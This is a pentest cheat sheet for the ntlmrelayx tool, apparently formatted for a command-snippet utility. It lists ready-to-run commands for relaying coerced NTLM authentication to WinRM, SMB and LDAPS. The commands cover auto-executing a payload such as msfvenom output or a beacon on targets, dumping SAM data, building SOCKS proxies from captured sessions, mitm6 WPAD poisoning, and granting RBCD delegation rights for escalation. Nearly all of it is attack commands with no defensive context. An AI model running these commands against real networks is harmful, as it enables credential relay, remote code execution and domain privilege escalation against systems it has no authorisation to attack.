# Ntlmrelayx

## ntlmrelayx - coercion - remote

### Relay to WinRM

Catch coerced NTLM auth and relay it to WinRM (5985) on the target. `-smb2support` lets the SMB receiver accept SMBv2/3 connections.

```sh title:"Ntlmrelayx Relay coerced NTLM to WinRM, SMB2 receiver enabled"
ntlmrelayx.py -smb2support -t winrms://$rhost_ip
```
<!-- cheat
import domain_ip
-->

### Relay to SMB + drop payload

Relay coerced NTLM to SMB on the targets in `$targets_file` and auto-exec `$payload_file` (msfvenom output, beacon, etc.) under the relayed user.

```sh title:"Ntlmrelayx Relay to SMB and auto-exec payload on each target"
ntlmrelayx.py -tf $targets_file -smb2support -e $payload_file
```
<!-- cheat
var targets_file
var payload_file
-->

### Relay + SOCKS proxy

Stand up a SOCKS proxy backed by relayed sessions. Use `proxychains` with the resulting SOCKS endpoint to drive any tool through a captured session.

```sh title:"Ntlmrelayx Relay to SOCKS, drive tools through proxychains"
ntlmrelayx.py -tf $targets_file -socks -smb2support
```
<!-- cheat
var targets_file
-->

### Relay + dump

Default relay to SMB and dump captured info (SAM, shares, etc.) for each successful relay.

```sh title:"Ntlmrelayx Relay to targets, dump info on each successful auth"
ntlmrelayx.py -tf $targets_file -smb2support
```
<!-- cheat
var targets_file
-->

## ntlmrelayx - mitm6 chain

### Relay to SMB target

Pair with mitm6 to redirect WPAD/DNS, then relay the resulting NTLM to SMB on the target. `-wh` is the attacker IP advertised as WPAD.

```sh title:"mitm6 + ntlmrelayx to SMB target with SOCKS"
ntlmrelayx.py -6 -wh $lhost -t smb://$rhost_ip -l /tmp -socks -debug
```
<!-- cheat
import tun_ip
import domain_ip
-->

### Delegate access via LDAPS

Relay coerced NTLM to LDAPS on the DC and abuse it to grant RBCD/delegation rights — classic mitm6 escalation step.

```sh title:"Ntlmrelayx Relay to LDAPS for RBCD/delegate-access escalation"
ntlmrelayx.py -t ldaps://$rhost_ip -wh $lhost --delegate-access
```
<!-- cheat
import tun_ip
import domain_ip
-->

